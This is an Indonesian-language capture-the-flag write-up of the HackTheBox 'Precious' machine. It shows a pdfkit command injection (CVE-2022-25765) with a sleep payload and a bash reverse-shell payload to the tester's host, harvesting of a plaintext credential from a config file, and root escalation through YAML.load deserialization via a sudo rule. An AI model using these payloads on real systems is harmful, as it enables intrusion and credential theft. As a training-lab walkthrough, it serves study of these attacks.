---
title: "HackTheBox - Precious WriteUps"
date: 2022-12-12 19:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox Precious WriteUps

Scanning dengan Nmap seperti biasa dan kita bisa melihat Port yang terbuka seperti Port 22 SSH dan Port 80 http nginx 1.18.0. Selanjutnya kita mencoba fokus pada Port 80 http

```
┌──(root㉿yupy)-[~]
└─# nmap -sC -sV precious.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-12 04:13 PST
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

Pada 10.10.11.189 ini akan diarahkan pada precious.htb dan jangan lupa tambahkan domain tersebut pada /etc/hosts. Tampilan pada Port 80 ini menampilkan halaman search engine convert web page to PDF. Kita coba cari kerentanan yang terdapat search engine convert web page to PDF.

![image](https://media.discordapp.net/attachments/740245586095112242/1051834546783531068/image.png)

Sekarang coba mengarahkan Web Page to PDF dengan Server kita sendiri, dengan mencoba menyambungkan dengan server kita.

![image](https://media.discordapp.net/attachments/740245586095112242/1051834923369111552/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1051835167121100810/image.png)

Dengan kita menambahkan payload url http server kita dapat mendownload file PDF otomatis yang ada di server target, dan PDF ini juga berisi Directory Listing website kita sendiri.

![image](https://media.discordapp.net/attachments/740245586095112242/1051835355680219136/image.png?width=859&height=580)
![image](https://media.discordapp.net/attachments/740245586095112242/1051835389486313556/image.png)

Dengan kita mendownload PDF dari website target, kita coba untuk menggunakan exiftool untuk melihat lebih dalam di file PDF tersebut.

![image](https://media.discordapp.net/attachments/740245586095112242/1051835420884881408/image.png)

Selanjutnya disini kami menemukan bahwa website ini vulnerability CVE-2022-25765 yang saya peroleh pada [Artikel](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). Berikut ini kami mencoba menambahkan payload pada:
```
http://10.10.14.16:8000/?name=#{'%20`sleep 5`'}")
```

Disini bahwa payload sleep menandakan tertidur, dan file PDF terdownload otomatis.

![image](https://media.discordapp.net/attachments/740245586095112242/1051835488467697734/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1051835517639069767/image.png?width=804&height=580)

Selanjutnya kita disini mencoba payload sleep menjadi revshell, Dengan revshells.com kita dapat membuat reverse shell menggunakan python dan sambungkan netcat pada terminal untuk melihat apakah berhasil backconnect.

```
http://10.10.14.16:8000/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.16/1337 0>&1"`'}
```
![image](https://media.discordapp.net/attachments/740245586095112242/1051835579312123934/image.png)

Setelah kita dapat backconnect dengan website disini kita coba mencari Informasi Senstive dan mendapatkanya pada directory “cat .bundle/config” 

![image](https://media.discordapp.net/attachments/740245586095112242/1051836735430066226/image.png)
```
ruby@precious:~$ find . -iname 'config' -type f | xargs -I REPLACE ls -halF REPLACE
<config' -type f | xargs -I REPLACE ls -halF REPLACE
-r-xr-xr-x 1 root ruby 62 Sep 26 05:04 ./.bundle/config*
ruby@precious:~$ cat .bundle/config
cat .bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Kita mencoba menghubungkan dengan SSH dengan “ssh henry@10.10.11.189” password: Q3c1AqGHtoI0aXAYFH

```
┌──(root㉿yupy)-[~]
└─# ssh henry@10.10.11.189
henry@10.10.11.189's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ ls
user.txt
henry@precious:~$ cat user.txt
08******************************8
```
Disini kita berhasil masuk pada SSH. Kita mencoba untuk melihat sudoers apa saja yang bisa kita local privileges, Dengan melihat izin sudoers, kita dapat menjalankan file ruby sebagai root.

```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Jika kita membaca file tersebut, kita dapat melihat bahwa di satu bagian mendapatkan file yml yang mencoba memuat dependencies.yml

```
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
![image](https://media.discordapp.net/attachments/740245586095112242/1051837942324273253/image.png)

Kita melihat bahwa itu menggunakan YAML.load, yang rentan terhadap deserialization attack. Anda dapat membaca lebih lanjut tentang deserialization YAML [disini](https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md). Kita disini mencoba membuat file “dependencies.yml” dengan [payload](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) untuk mengexploitasikan.

![image](https://media.discordapp.net/attachments/740245586095112242/1051838267147943936/image.png)
```
henry@precious:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:~$ bash -p
bash-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) groups=1000(henry)
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
df********************************c
```
![image](https://media.discordapp.net/attachments/740245586095112242/1051832917434847232/image.png?width=604&height=580)

